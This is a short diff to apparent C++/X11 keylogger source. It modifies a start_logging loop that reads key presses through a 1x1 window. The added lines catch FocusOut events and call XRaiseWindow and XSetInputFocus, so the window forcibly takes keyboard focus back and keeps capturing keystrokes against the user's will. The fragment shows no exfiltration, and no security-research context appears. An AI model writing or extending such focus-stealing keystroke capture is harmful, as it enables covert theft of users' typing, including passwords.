@@ -234,15 +234,20 @@ public:
         win = XCreateSimpleWindow(disp, RootWindow(disp, scr), 10, 10, 1, 1, 0,
                                BlackPixel(disp, scr), WhitePixel(disp, scr));
 
-        int res = XSelectInput(disp, win, KeyPressMask);
-        res = XMapWindow(disp, win);
+        XSelectInput(disp, win, KeyPressMask| FocusChangeMask);
+        XMapWindow(disp, win);
         return std::string{};
     }
     void start_logging() {
         while (true) {
-            auto res = XCheckMaskEvent(disp, KeyPressMask, &event);
+            auto res = XCheckMaskEvent(disp, KeyPressMask | FocusChangeMask, &event);
+
             /* keyboard events */
             if (res) {
+                if (event.type == FocusOut) {
+                    XRaiseWindow(disp, win); // Need raise window to the top. To get input focus
+                    XSetInputFocus(disp, win, RevertToParent, CurrentTime);
+                }
                 if (event.type == KeyPress)
                 {
                     unsigned int keycode = event.xkey.keycode;
